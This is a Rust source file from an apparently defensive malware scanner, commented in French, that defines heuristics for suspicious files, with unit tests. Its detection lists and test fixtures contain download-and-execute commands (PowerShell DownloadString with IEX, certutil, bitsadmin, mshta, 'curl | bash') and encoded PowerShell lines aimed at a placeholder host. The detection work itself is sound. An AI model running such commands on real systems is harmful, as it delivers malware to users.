//! Les heuristiques du moteur d'analyse : des signes, relevés sur une partie d'un fichier lue par le socle
//! (`analyse`), qui rendent un fichier « suspect », jamais « malveillant ». Un signe seul ne déclenche aucun geste
//! automatique (ni quarantaine, ni arrêt) : il est dit, avec ce qui l'a levé, et la personne décide. Un faux positif
//! connu se tait par sa clé « normales » (`heuristique|<code>|sha256:<empreinte de la partie>`, voir
//! `moteur::Indice`), liée au contenu exact : le même nom avec un autre contenu parle de nouveau.
//!
//! Chaque heuristique dit sa référence (MITRE ATT&CK ou documentation de l'éditeur). Toutes se contournent : un
//! programme signé par un certificat volé, un paqueteur à faible entropie, un script obscurci autrement. Elles
//! s'ajoutent aux signatures, elles ne les remplacent pas (MODELE-DE-MENACE.md, « Moteur d'analyse »).
//!
//! Module pur, sans interface ni texte affiché (le moteur les met en mots, dans les deux langues) : le banc de
//! fuzzing l'inclut par son chemin, avec `analyse` et `pe`. Les données lues sont hostiles : tout est borné, sans
//! panique.

// Ni débordement ni `as` : module lu par le banc de fuzzing, sur des données hostiles (Cargo.toml, [lints.clippy]).
#![warn(clippy::arithmetic_side_effects, clippy::as_conversions)]
// Ni `unsafe` : refusé sans recours, aucun `allow` intérieur ne le lève (garde : chaque_module_fuzze_refuse_unsafe).
#![forbid(unsafe_code)]

use crate::analyse::nom::{self, FaitNom};
use crate::analyse::texte::{self, Langage};
use crate::analyse::{Details, Fait, Partie, Raison, Type};
use crate::pe::Authenticode;

/// Ce qu'un texte peut faire lire, au plus, aux heuristiques des scripts : un script de plus d'un mégaoctet est
/// regardé sur son premier mégaoctet (les signatures, elles, lisent tout).
const TEXTE_MAX: usize = 1 << 20;

/// L'entropie d'une section exécutable, en millièmes de bit par octet, au-delà de laquelle son code est compressé ou
/// chiffré : du code machine ordinaire reste sous 6,8 ; un paqueteur (UPX, MPRESS, Themida…) l'approche de 8. Le seuil
/// du socle (`Fait::SectionEntropieElevee`, toute section) est le même ; ici, seules les sections exécutables
/// comptent : une ressource compressée (icônes, données) dans une section de données est ordinaire.
const ENTROPIE_PAQUETEUR: u16 = 7200;

/// Ce qu'une base64 doit compter de caractères pour passer pour une commande encodée (« -enc » suivi d'une courte
/// valeur est plutôt un autre paramètre) : 32 caractères font 24 octets, 12 caractères en UTF-16.
const BASE64_MIN: usize = 32;

/// Où se trouve le fichier examiné : ce que l'heuristique du programme sans signature regarde.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum Lieu {
    Ordinaire,
    /// Un dossier temporaire (%TEMP%, /tmp) : là où un programme lancé par un document ou un script dépose ce qu'il
    /// télécharge.
    Temporaire,
    /// Le dossier des téléchargements de la personne.
    Telechargements,
}

/// Une heuristique.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub(crate) enum Heuristique {
    /// Un programme Windows sans signature Authenticode (ou à la signature illisible), dans un dossier temporaire ou
    /// de téléchargement. ATT&CK T1204.002 (User Execution: Malicious File) et T1105 (Ingress Tool Transfer) ;
    /// Microsoft, « Authenticode Digital Signatures » et SmartScreen (réputation d'un programme non signé).
    PeNonSigne,
    /// Une section d'un PE, ou un segment d'un ELF, à la fois écrivable et exécutable : du code qui se réécrit en
    /// mémoire (décompresseur, déchiffreur). ATT&CK T1027.002 (Software Packing) ; Microsoft, « PE Format »
    /// (IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE).
    EcrivableExecutable,
    /// Une section exécutable à l'entropie d'un contenu compressé ou chiffré, ou un paqueteur reconnu (UPX).
    /// ATT&CK T1027.002 (Software Packing).
    Paqueteur,
    /// Un nom qui trompe sur la nature du fichier : double extension (« facture.pdf.exe »), blancs avant l'extension,
    /// caractère qui inverse l'écriture dans le nom d'un programme, extension de document sur un programme.
    /// ATT&CK T1036.007 (Double File Extension), T1036.002 (Right-to-Left Override), T1036.008 (Masquerade File Type).
    NomTrompeur,
    /// Une macro Office qui se lance d'elle-même à l'ouverture (AutoOpen, Document_Open, Workbook_Open…).
    /// ATT&CK T1059.005 (Visual Basic) et T1204.002 ; Microsoft, « Macros from the internet are blocked by default in
    /// Office ».
    MacroAOuverture,
    /// Une commande PowerShell encodée en base64 (-EncodedCommand et ses abréviations), ou une base64 décodée puis
    /// exécutée (FromBase64String et Invoke-Expression). ATT&CK T1059.001 (PowerShell) et T1027.010 (Command
    /// Obfuscation) ; Microsoft, « about_PowerShell_exe » (-EncodedCommand).
    PowerShellEncode,
    /// Un script qui télécharge puis lance (PowerShell, certutil -urlcache, bitsadmin /transfer, mshta d'une adresse,
    /// l'appel urlmon qui télécharge vers un fichier, XMLHTTP et ADODB.Stream, curl ou wget passés à un shell). ATT&CK T1105 (Ingress Tool
    /// Transfer), T1197 (BITS Jobs), T1218.005 (Mshta) ; Microsoft, « certutil » (-urlcache).
    Telechargeur,
    /// Un raccourci (.lnk) qui lance un interpréteur (PowerShell, cmd, mshta, wscript…) avec des arguments.
    /// ATT&CK T1204.002 et T1547.009 (Shortcut Modification) ; Microsoft, « [MS-SHLLINK] ».
    RaccourciInterpreteur,
}

impl Heuristique {
    /// Toutes, dans l'ordre du rapport.
    pub(crate) const TOUTES: [Heuristique; 8] = [
        Heuristique::PeNonSigne,
        Heuristique::EcrivableExecutable,
        Heuristique::Paqueteur,
        Heuristique::NomTrompeur,
        Heuristique::MacroAOuverture,
        Heuristique::PowerShellEncode,
        Heuristique::Telechargeur,
        Heuristique::RaccourciInterpreteur,
    ];

    /// Son code stable : clé « normales », `--json`, journal.
    pub(crate) fn code(self) -> &'static str {
        match self {
            Heuristique::PeNonSigne => "pe-non-signe",
            Heuristique::EcrivableExecutable => "ecrivable-executable",
            Heuristique::Paqueteur => "paqueteur",
            Heuristique::NomTrompeur => "nom-trompeur",
            Heuristique::MacroAOuverture => "macro-a-l-ouverture",
            Heuristique::PowerShellEncode => "powershell-encode",
            Heuristique::Telechargeur => "telechargeur",
            Heuristique::RaccourciInterpreteur => "raccourci-interpreteur",
        }
    }
}

/// Un signe relevé : l'heuristique et ce qui l'a levée, en données brutes (nom de section, extension, interpréteur,
/// marque trouvée), que le moteur met en mots.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(crate) struct Signe {
    pub heuristique: Heuristique,
    pub detail: String,
}

/// Les signes d'une partie lue (ses faits et détails remplis par le socle), `octets` étant son contenu. Une
/// heuristique donne au plus un signe par partie.
pub(crate) fn juger(p: &Partie, octets: &[u8], lieu: Lieu) -> Vec<Signe> {
    let mut signes: Vec<Signe> = Vec::new();
    let mut lever = |heuristique: Heuristique, detail: String| {
        if !signes.iter().any(|s| s.heuristique == heuristique) {
            signes.push(Signe { heuristique, detail });
        }
    };
    if let Some(d) = pe_non_signe(p, lieu) {
        lever(Heuristique::PeNonSigne, d);
    }
    if let Some(d) = ecrivable_executable(p) {
        lever(Heuristique::EcrivableExecutable, d);
    }
    if let Some(d) = paqueteur(p) {
        lever(Heuristique::Paqueteur, d);
    }
    if let Some(d) = nom_trompeur(p) {
        lever(Heuristique::NomTrompeur, d);
    }
    if let Some(nom) = p.faits.iter().find_map(|f| match f {
        Fait::ProcedureAutomatique(n) => Some(n.clone()),
        _ => None,
    }) {
        lever(Heuristique::MacroAOuverture, nom);
    }
    if p.type_ == Type::Lnk {
        let interpreteur = p.faits.iter().find_map(|f| match f {
            Fait::InterpreteurLance(i) => Some(*i),
            _ => None,
        });
        let arguments = match &p.details {
            Details::Lnk(l) => l.arguments.as_deref().map(str::trim).filter(|a| !a.is_empty()),
            _ => None,
        };
        if let (Some(i), Some(a)) = (interpreteur, arguments) {
            lever(Heuristique::RaccourciInterpreteur, i.to_string());
            let a = a.to_ascii_lowercase();
            let powershell = matches!(i, "powershell.exe" | "pwsh.exe");
            if let Some(d) = powershell_encode(&a, powershell) {
                lever(Heuristique::PowerShellEncode, d);
            }
            // Le raccourci lance déjà un interpréteur : une seule marque de téléchargement suffit.
            if let Some(d) = telechargement_windows(&a, true) {
                lever(Heuristique::Telechargeur, d);
            }
        }
    }
    if let Some(famille) = famille_de_script(p) {
        let t = texte_de(octets).to_ascii_lowercase();
        match famille {
            Famille::Windows(langage) => {
                if let Some(d) = powershell_encode(&t, langage == Some(Langage::PowerShell)) {
                    lever(Heuristique::PowerShellEncode, d);
                }
                if let Some(d) = telechargement_windows(&t, false) {
                    lever(Heuristique::Telechargeur, d);
                }
            }
            Famille::Shell => {
                if let Some(d) = telechargement_shell(&t) {
                    lever(Heuristique::Telechargeur, d);
                }
            }
        }
    }
    signes
}

fn pe_non_signe(p: &Partie, lieu: Lieu) -> Option<String> {
    if lieu == Lieu::Ordinaire || p.type_ != Type::Pe {
        return None;
    }
    p.faits.iter().find_map(|f| match f {
        Fait::Authenticode(Authenticode::Absente) => Some(String::new()),
        Fait::Authenticode(Authenticode::Illisible) => Some("illisible".to_string()),
        _ => None,
    })
}

fn ecrivable_executable(p: &Partie) -> Option<String> {
    p.faits.iter().find_map(|f| match f {
        Fait::SectionEcrivableExecutable(nom) => Some(nom.clone()),
        Fait::SegmentEcrivableExecutable => Some("PT_LOAD".to_string()),
        _ => None,
    })
}

fn paqueteur(p: &Partie) -> Option<String> {
    if let Some(nom) = p.manques.iter().find_map(|r| match r {
        Raison::Paquete(nom) => Some(*nom),
        _ => None,
    }) {
        return Some(nom.to_string());
    }
    match &p.details {
        Details::Pe(s) => s
            .sections
            .iter()
            .find(|s| s.executable() && s.entropie > ENTROPIE_PAQUETEUR)
            .map(|s| s.nom.clone()),
        _ => None,
    }
}

fn nom_trompeur(p: &Partie) -> Option<String> {
    let programme =
        p.type_.executable() || nom::extension(&p.chemin).is_some_and(|e| nom::PROGRAMMES.contains(&e.as_str()));
    p.faits.iter().find_map(|f| match f {
        Fait::Nom(FaitNom::DoubleExtension { avant, extension }) => Some(format!(".{avant}.{extension}")),
        Fait::Nom(FaitNom::BlancsAvantExtension) => Some("…   .".to_string()),
        // Un nom en arabe ou en hébreu peut porter une marque de direction : seul celui d'un programme compte.
        Fait::Nom(FaitNom::Bidi(c)) if programme => Some(format!("U+{:04X}", u32::from(*c))),
        Fait::ExtensionTrompeuse(e) => Some(format!(".{e}")),
        _ => None,
    })
}

/// Quelles marques chercher dans un texte.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Famille {
    /// Les scripts de Windows (et le texte sans langage reconnu : un .bat d'une ligne) ; `Some(PowerShell)` quand le
    /// langage est déjà PowerShell.
    Windows(Option<Langage>),
    /// Un script shell : curl ou wget passés à un shell.
    Shell,
}

fn famille_de_script(p: &Partie) -> Option<Famille> {
    match p.type_ {
        Type::Script(
            l @ (Langage::PowerShell
            | Langage::VbScript
            | Langage::JScript
            | Langage::Batch
            | Langage::Html
            | Langage::Xml
            | Langage::Texte),
        ) => Some(Famille::Windows(Some(l))),
        Type::Texte | Type::SourceVba => Some(Famille::Windows(None)),
        Type::Script(Langage::Shell) => Some(Famille::Shell),
        _ => None,
    }
}

/// Le texte d'une partie, au plus `TEXTE_MAX` octets, décodé (UTF-16 compris) ; à défaut, lu octet par octet.
fn texte_de(octets: &[u8]) -> String {
    let debut = octets.get(..TEXTE_MAX).unwrap_or(octets);
    texte::lire(debut, TEXTE_MAX).map_or_else(|| String::from_utf8_lossy(debut).into_owned(), |t| t.contenu)
}

/// `mot` est-il dans `t`, entouré de ce qui n'est ni lettre, ni chiffre, ni « _ » ?
fn contient_mot(t: &str, mot: &str) -> bool {
    let colle = |c: Option<char>| c.is_some_and(|c| c.is_alphanumeric() || c == '_');
    t.match_indices(mot).any(|(i, _)| {
        let avant = t.get(..i).and_then(|a| a.chars().next_back());
        let apres = i
            .checked_add(mot.len())
            .and_then(|f| t.get(f..))
            .and_then(|a| a.chars().next());
        !colle(avant) && !colle(apres)
    })
}

/// Un paramètre de powershell.exe qui annonce une commande encodée : une abréviation de -EncodedCommand (PowerShell
/// accepte tout début non ambigu, dès « -e ») ou l'alias « -ec », précédé de « - », « – » ou « / ».
fn drapeau_encode(mot: &str) -> bool {
    let Some(reste) = mot
        .strip_prefix('-')
        .or_else(|| mot.strip_prefix('/'))
        .or_else(|| mot.strip_prefix('\u{2013}'))
    else {
        return false;
    };
    !reste.is_empty() && ("encodedcommand".starts_with(reste) || reste == "ec")
}

fn base64(mot: &str) -> bool {
    mot.len() >= BASE64_MIN
        && mot
            .bytes()
            .all(|o| o.is_ascii_alphanumeric() || matches!(o, b'+' | b'/' | b'='))
}

/// Une commande PowerShell encodée, dans `t` en minuscules. `powershell` : PowerShell est déjà le langage, ou
/// l'interpréteur lancé ; sinon, pour un paramètre « -enc », le texte doit le nommer (« -e » est commun ailleurs).
/// FromBase64String suivi d'Invoke-Expression est propre à PowerShell : il compte partout.
fn powershell_encode(t: &str, powershell: bool) -> Option<String> {
    if t.contains("frombase64string") && (contient_mot(t, "iex") || t.contains("invoke-expression")) {
        return Some("FromBase64String + Invoke-Expression".to_string());
    }
    if !(powershell || contient_mot(t, "powershell") || contient_mot(t, "pwsh")) {
        return None;
    }
    let separe = |c: char| c.is_whitespace() || matches!(c, '"' | '\'' | '`' | '(' | ')' | ',' | ';');
    let mots: Vec<&str> = t.split(separe).filter(|m| !m.is_empty()).collect();
    mots.windows(2).find_map(|p| match p {
        [d, v] if drapeau_encode(d) && base64(v) => Some((*d).to_string()),
        _ => None,
    })
}

/// Ce que PowerShell offre pour télécharger.
const TELECHARGE_PS: &[&str] = &[
    "downloadstring(",
    "downloadfile(",
    "downloaddata(",
    "invoke-webrequest",
    "invoke-restmethod",
    "start-bitstransfer",
    "net.webclient",
];

/// Un téléchargement dans un script de Windows, dans `t` en minuscules. `seul` : une marque de téléchargement de
/// PowerShell suffit (un raccourci qui lance un interpréteur) ; sinon, elle doit s'accompagner d'une exécution.
fn telechargement_windows(t: &str, seul: bool) -> Option<String> {
    let telecharge = TELECHARGE_PS
        .iter()
        .find(|m| t.contains(**m))
        .map(|m| m.trim_end_matches('(').to_string())
        .or_else(|| {
            ["iwr", "irm"]
                .iter()
                .find(|m| contient_mot(t, m))
                .map(ToString::to_string)
        });
    if let Some(m) = telecharge {
        let execute = contient_mot(t, "iex")
            || [
                "invoke-expression",
                "start-process",
                "invoke-item",
                "rundll32",
                "regsvr32",
            ]
            .iter()
            .any(|e| t.contains(e));
        if seul || execute {
            return Some(m);
        }
    }
    if contient_mot(t, "certutil") && (t.contains("-urlcache") || t.contains("/urlcache")) {
        return Some("certutil -urlcache".to_string());
    }
    if contient_mot(t, "bitsadmin") && t.contains("/transfer") {
        return Some("bitsadmin /transfer".to_string());
    }
    if contient_mot(t, "mshta") && (t.contains("http://") || t.contains("https://")) {
        return Some("mshta http".to_string());
    }
    if t.contains("urldownloadtofile") {
        return Some("urlmon, téléchargement vers un fichier".to_string());
    }
    if (t.contains("xmlhttp") || t.contains("winhttprequest")) && t.contains("adodb.stream") && t.contains("savetofile")
    {
        return Some("XMLHTTP + ADODB.Stream".to_string());
    }
    None
}

/// curl ou wget dont la sortie va droit à un shell (« curl … | sh »), dans `t` en minuscules.
fn telechargement_shell(t: &str) -> Option<String> {
    for ligne in t.lines() {
        for outil in ["curl", "wget"] {
            let Some(debut) = ligne
                .match_indices(outil)
                .map(|(i, _)| i)
                .find(|i| contient_mot(ligne.get(*i..).unwrap_or(""), outil) && mot_commence(ligne, *i))
            else {
                continue;
            };
            let reste = ligne.get(debut..).unwrap_or("");
            for (i, _) in reste.match_indices('|') {
                let apres = reste.get(i.saturating_add(1)..).unwrap_or("");
                // « || » est un « ou » du shell, pas un tube.
                if apres.starts_with('|') || reste.get(..i).is_some_and(|a| a.ends_with('|')) {
                    continue;
                }
                if let Some(s) = shell_du_tube(apres) {
                    return Some(format!("{outil} | {s}"));
                }
            }
        }
    }
    None
}

/// Le mot qui commence à `i` dans `ligne` n'est pas collé à ce qui le précède.
/// Le shell qui reçoit un tube, en tête de la commande ou derrière un ou deux mots qui l'enveloppent (un outil
/// d'élévation, `env`, une option) ; un filtre de texte (`grep sh`) lit la sortie sans la lancer : on s'y arrête.
fn shell_du_tube(commande: &str) -> Option<&'static str> {
    const SHELLS: [&str; 5] = ["sh", "bash", "zsh", "dash", "ksh"];
    const FILTRES: [&str; 16] = [
        "grep", "egrep", "fgrep", "rg", "sed", "awk", "tee", "head", "tail", "cut", "sort", "uniq", "wc", "jq", "less",
        "cat",
    ];
    for mot in commande.split_whitespace().take(3) {
        let mot = mot.trim_end_matches(';');
        let nom = mot.rsplit('/').next().unwrap_or(mot);
        if let Some(s) = SHELLS.iter().find(|s| **s == nom) {
            return Some(s);
        }
        if FILTRES.contains(&nom) || mot.contains(['|', '>', '<', '&']) {
            return None;
        }
    }
    None
}

fn mot_commence(ligne: &str, i: usize) -> bool {
    !ligne
        .get(..i)
        .and_then(|a| a.chars().next_back())
        .is_some_and(|c| c.is_alphanumeric() || c == '_' || c == '-' || c == '.' || c == '/')
}

#[allow(
    clippy::arithmetic_side_effects,
    clippy::as_conversions,
    clippy::cast_possible_truncation,
    reason = "essais : y déborder fait échouer l'essai"
)]
#[cfg(test)]
mod tests {
    use super::*;
    use crate::analyse::{Bornes, analyser};

    /// Les signes de chaque partie d'un fichier fabriqué, lu par le vrai socle.
    fn signes(octets: &[u8], nom: &str, lieu: Lieu) -> Vec<(Heuristique, String)> {
        let mut vus = Vec::new();
        analyser(octets, nom, &Bornes::default(), &mut |p, o| {
            vus.extend(juger(p, o, lieu).into_iter().map(|s| (s.heuristique, s.detail)));
        });
        vus
    }

    fn heuristiques(octets: &[u8], nom: &str, lieu: Lieu) -> Vec<Heuristique> {
        signes(octets, nom, lieu).into_iter().map(|(h, _)| h).collect()
    }

    #[test]
    fn codes_stables_et_distincts() {
        let codes: Vec<&str> = Heuristique::TOUTES.iter().map(|h| h.code()).collect();
        let mut tries = codes.clone();
        tries.sort_unstable();
        tries.dedup();
        assert_eq!(tries.len(), codes.len());
        assert!(codes.iter().all(|c| !c.contains('|') && c.is_ascii()));
    }

    #[test]
    fn programme_sans_signature_seulement_hors_des_dossiers_ordinaires() {
        let pe = corpus::pe(&[(".text", corpus::RX, &[0x90; 512])], false);
        assert_eq!(heuristiques(&pe, "outil.exe", Lieu::Ordinaire), []);
        assert_eq!(
            heuristiques(&pe, "outil.exe", Lieu::Telechargements),
            [Heuristique::PeNonSigne]
        );
        assert_eq!(
            heuristiques(&pe, "outil.exe", Lieu::Temporaire),
            [Heuristique::PeNonSigne]
        );
        // Signé (une table de certificats PKCS#7 annoncée) : rien, même téléchargé.
        let signe = corpus::pe(&[(".text", corpus::RX, &[0x90; 512])], true);
        assert_eq!(heuristiques(&signe, "outil.exe", Lieu::Telechargements), []);
    }

    #[test]
    fn section_ecrivable_et_executable() {
        let pe = corpus::pe(&[(".text", corpus::RWX, &[0x90; 512])], true);
        assert_eq!(
            signes(&pe, "a.exe", Lieu::Ordinaire),
            [(Heuristique::EcrivableExecutable, ".text".to_string())]
        );
        let elf = corpus::elf_wx();
        assert_eq!(
            heuristiques(&elf, "a", Lieu::Ordinaire),
            [Heuristique::EcrivableExecutable]
        );
        assert_eq!(heuristiques(&corpus::elf_sain(), "a", Lieu::Ordinaire), []);
    }

    #[test]
    fn entropie_de_paqueteur_dans_une_section_executable() {
        let chiffre = corpus::alea(4096);
        let pe = corpus::pe(&[(".text", corpus::RX, &chiffre)], true);
        assert_eq!(
            signes(&pe, "a.exe", Lieu::Ordinaire),
            [(Heuristique::Paqueteur, ".text".to_string())]
        );
        // Les mêmes octets dans une section de données (ressources compressées) : ordinaires.
        let donnees = corpus::pe(
            &[(".text", corpus::RX, &[0x90; 512]), (".rsrc", corpus::R, &chiffre)],
            true,
        );
        assert_eq!(heuristiques(&donnees, "a.exe", Lieu::Ordinaire), []);
    }

    #[test]
    fn noms_trompeurs() {
        let pe = corpus::pe(&[(".text", corpus::RX, &[0x90; 512])], true);
        assert_eq!(
            signes(&pe, "facture.pdf.exe", Lieu::Ordinaire),
            [(Heuristique::NomTrompeur, ".pdf.exe".to_string())]
        );
        assert_eq!(
            heuristiques(&pe, "photo.jpg", Lieu::Ordinaire),
            [Heuristique::NomTrompeur]
        );
        assert_eq!(
            heuristiques(&pe, "photo\u{202E}gpj.exe", Lieu::Ordinaire),
            [Heuristique::NomTrompeur]
        );
        assert_eq!(
            heuristiques(&pe, "facture.pdf      .exe", Lieu::Ordinaire),
            [Heuristique::NomTrompeur]
        );
        // Une marque de direction dans le nom d'un document : un nom en arabe ou en hébreu, pas un piège.
        assert_eq!(heuristiques(b"bonjour", "\u{202B}rapport.txt", Lieu::Ordinaire), []);
        assert_eq!(heuristiques(b"bonjour", "rapport.final.txt", Lieu::Ordinaire), []);
    }

    #[test]
    fn macro_qui_se_lance_a_l_ouverture() {
        let doc = corpus::doc_a_macro("Sub AutoOpen()\r\n  MsgBox \"x\"\r\nEnd Sub\r\n");
        let h = signes(&doc, "lettre.doc", Lieu::Ordinaire);
        assert!(
            h.iter()
                .any(|(h, d)| *h == Heuristique::MacroAOuverture && d.eq_ignore_ascii_case("autoopen")),
            "{h:?}"
        );
        let calme = corpus::doc_a_macro("Sub Calculer()\r\n  MsgBox \"x\"\r\nEnd Sub\r\n");
        assert!(!heuristiques(&calme, "lettre.doc", Lieu::Ordinaire).contains(&Heuristique::MacroAOuverture));
    }

    #[test]
    fn powershell_encode_dans_un_script() {
        let b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA";
        for (texte, nom) in [
            (
                format!("@echo off\r\npowershell -nop -w hidden -enc {b64}\r\n"),
                "a.bat",
            ),
            (format!("powershell.exe -EncodedCommand {b64}"), "a.txt"),
            (format!("pwsh /e {b64}"), "a.cmd"),
            (
                format!("Set s = CreateObject(\"WScript.Shell\")\r\ns.Run \"powershell -ec {b64}\"\r\n"),
                "a.vbs",
            ),
            (
                "$c = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($x)); IEX $c".to_string(),
                "a.ps1",
            ),
        ] {
            assert!(
                heuristiques(texte.as_bytes(), nom, Lieu::Ordinaire).contains(&Heuristique::PowerShellEncode),
                "{texte}"
            );
        }
        // UTF-16 : le socle le décode, l'heuristique aussi.
        let utf16: Vec<u8> = std::iter::once(0xFEFF_u16)
            .chain(format!("powershell -enc {b64}").encode_utf16())
            .flat_map(u16::to_le_bytes)
            .collect();
        assert!(heuristiques(&utf16, "a.bat", Lieu::Ordinaire).contains(&Heuristique::PowerShellEncode));
        // Pas un -e de bash, ni une base64 courte, ni sans PowerShell.
        for texte in [
            format!("#!/bin/sh\nset -e {b64}\n"),
            "powershell -enc abc".to_string(),
            format!("program -enc {b64}"),
            "powershell -ExecutionPolicy Bypass -File installer.ps1".to_string(),
        ] {
            assert!(
                !heuristiques(texte.as_bytes(), "a.txt", Lieu::Ordinaire).contains(&Heuristique::PowerShellEncode),
                "{texte}"
            );
        }
    }

    #[test]
    fn telechargeurs() {
        for (texte, nom, marque) in [
            (
                "IEX (New-Object Net.WebClient).DownloadString('http://exemple.invalid/a')",
                "a.ps1",
                "downloadstring",
            ),
            (
                "iwr http://exemple.invalid/a.exe -OutFile $env:TEMP\\a.exe; Start-Process $env:TEMP\\a.exe",
                "a.ps1",
                "iwr",
            ),
            (
                "@echo off\r\ncertutil -urlcache -split -f http://exemple.invalid/a.exe %TEMP%\\a.exe\r\n",
                "a.bat",
                "certutil -urlcache",
            ),
            (
                "bitsadmin /transfer j http://exemple.invalid/a.exe C:\\a.exe",
                "a.cmd",
                "bitsadmin /transfer",
            ),
            ("mshta https://exemple.invalid/a.hta", "a.bat", "mshta http"),
            (
                "Set x = CreateObject(\"MSXML2.XMLHTTP\")\r\nSet s = CreateObject(\"ADODB.Stream\")\r\ns.SaveToFile \"a.exe\"\r\n",
                "a.vbs",
                "XMLHTTP + ADODB.Stream",
            ),
            (
                "#!/bin/sh\ncurl -fsSL https://exemple.invalid/i.sh | sudo bash\n",
                "i.sh",
                "curl | bash",
            ),
            (
                "#!/bin/bash\nwget -qO- https://exemple.invalid/i|sh\n",
                "i.sh",
                "wget | sh",
            ),
            (
                "#!/bin/sh\ncurl -fsSL https://exemple.invalid/i.sh | sudo -E /bin/bash -s\n",
                "i.sh",
                "curl | bash",
            ),
        ] {
            let s = signes(texte.as_bytes(), nom, Lieu::Ordinaire);
            assert!(
                s.contains(&(Heuristique::Telechargeur, marque.to_string())),
                "{texte} : {s:?}"
            );
        }
        // Télécharger sans lancer, curl dans un fichier, un « || » : pas des téléchargeurs.
        for (texte, nom) in [
            (
                "Invoke-WebRequest https://exemple.invalid/a.zip -OutFile a.zip",
                "a.ps1",
            ),
            ("#!/bin/sh\ncurl -o a.tar.gz https://exemple.invalid/a.tar.gz\n", "a.sh"),
            ("#!/bin/sh\ncurl -fsS https://exemple.invalid/ || shasum a\n", "a.sh"),
            ("#!/bin/sh\necho 'libcurl | shell' > /dev/null\n", "a.sh"),
            ("#!/bin/sh\ncurl -fsS https://exemple.invalid/l | grep sh\n", "a.sh"),
            ("#!/usr/bin/env python3\nimport os\nos.system('curl x | sh')\n", "a.py"),
        ] {
            assert!(
                !heuristiques(texte.as_bytes(), nom, Lieu::Ordinaire).contains(&Heuristique::Telechargeur),
                "{texte}"
            );
        }
    }

    #[test]
    fn raccourci_qui_lance_un_interpreteur() {
        let b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA";
        let lnk = corpus::lnk(
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            Some(&format!("-w hidden -enc {b64}")),
        );
        let h = heuristiques(&lnk, "facture.pdf.lnk", Lieu::Ordinaire);
        assert!(h.contains(&Heuristique::RaccourciInterpreteur), "{h:?}");
        assert!(h.contains(&Heuristique::PowerShellEncode), "{h:?}");
        let dl = corpus::lnk(
            "C:\\Windows\\System32\\cmd.exe",
            Some("/c powershell iwr http://exemple.invalid/a -o a.exe"),
        );
        assert!(heuristiques(&dl, "a.lnk", Lieu::Ordinaire).contains(&Heuristique::Telechargeur));
        // Un raccourci vers un interpréteur sans arguments (le menu Démarrer), ou vers un programme : rien.
        let menu = corpus::lnk("C:\\Windows\\System32\\cmd.exe", None);
        assert_eq!(heuristiques(&menu, "Invite de commandes.lnk", Lieu::Ordinaire), []);
        let bloc = corpus::lnk("C:\\Windows\\notepad.exe", Some("C:\\notes.txt"));
        assert_eq!(heuristiques(&bloc, "Bloc-notes.lnk", Lieu::Ordinaire), []);
    }

    #[test]
    fn mots_et_drapeaux() {
        assert!(contient_mot("a iex b", "iex"));
        assert!(contient_mot("iex(", "iex"));
        assert!(!contient_mot("bielex", "iex"));
        assert!(!contient_mot("iexplore", "iex"));
        for d in ["-e", "-en", "-enc", "-encodedcommand", "/enc", "-ec", "\u{2013}enc"] {
            assert!(drapeau_encode(d), "{d}");
        }
        for d in ["-", "-ex", "-encodedcommandx", "enc", "-executionpolicy"] {
            assert!(!drapeau_encode(d), "{d}");
        }
    }

    /// Des données quelconques ne font jamais paniquer (ce que la cible de fuzzing éprouve plus largement).
    #[test]
    fn donnees_quelconques() {
        let mut graine = 7u32;
        for taille in [0, 1, 7, 64, 513, 4096] {
            let octets: Vec<u8> = (0..taille)
                .map(|_| {
                    graine = graine.wrapping_mul(1_103_515_245).wrapping_add(12345);
                    (graine >> 16) as u8
                })
                .collect();
            for nom in ["a", "a.ps1", "x.pdf.exe", "\u{202E}", "a.lnk"] {
                let _ = signes(&octets, nom, Lieu::Telechargements);
            }
        }
    }
}

/// Un petit corpus de fichiers fabriqués en mémoire (PE, ELF, raccourci, document à macros) pour les essais des
/// heuristiques et du moteur. Rien de malveillant : des structures minimales qui portent le trait cherché.
#[cfg(test)]
#[allow(
    clippy::arithmetic_side_effects,
    clippy::as_conversions,
    clippy::cast_possible_truncation,
    reason = "essais : y déborder fait échouer l'essai"
)]
pub(crate) mod corpus {
    /// Caractéristiques de section : code, lecture, exécution (et écriture).
    pub(crate) const RX: u32 = 0x6000_0020;
    pub(crate) const RWX: u32 = 0xE000_0020;
    /// Données initialisées, en lecture.
    pub(crate) const R: u32 = 0x4000_0040;

    /// Des octets d'entropie proche de 8 (générateur congruentiel, graine fixe).
    pub(crate) fn alea(n: usize) -> Vec<u8> {
        let mut x = 0x2545_F491_u64;
        (0..n)
            .map(|_| {
                x ^= x << 13;
                x ^= x >> 7;
                x ^= x << 17;
                (x >> 24) as u8
            })
            .collect()
    }

    /// Un PE32+ minimal : en-têtes, sections données, et une table de certificats PKCS#7 si `signe`.
    pub(crate) fn pe(sections: &[(&str, u32, &[u8])], signe: bool) -> Vec<u8> {
        let aligne = |n: usize| n.div_ceil(0x200) * 0x200;
        let entetes = 0x400usize;
        let mut f = vec![0u8; entetes];
        f[0..2].copy_from_slice(b"MZ");
        f[0x3c..0x40].copy_from_slice(&0x80u32.to_le_bytes());
        f[0x80..0x84].copy_from_slice(b"PE\0\0");
        let coff = 0x84;
        f[coff..coff + 2].copy_from_slice(&0x8664u16.to_le_bytes());
        f[coff + 2..coff + 4].copy_from_slice(&(sections.len() as u16).to_le_bytes());
        let taille_opt = 240u16;
        f[coff + 16..coff + 18].copy_from_slice(&taille_opt.to_le_bytes());
        f[coff + 18..coff + 20].copy_from_slice(&0x0022u16.to_le_bytes());
        let opt = coff + 20;
        f[opt..opt + 2].copy_from_slice(&0x20Bu16.to_le_bytes());
        f[opt + 16..opt + 20].copy_from_slice(&0x1000u32.to_le_bytes());
        f[opt + 24..opt + 32].copy_from_slice(&0x1_4000_0000u64.to_le_bytes());
        f[opt + 32..opt + 36].copy_from_slice(&0x1000u32.to_le_bytes());
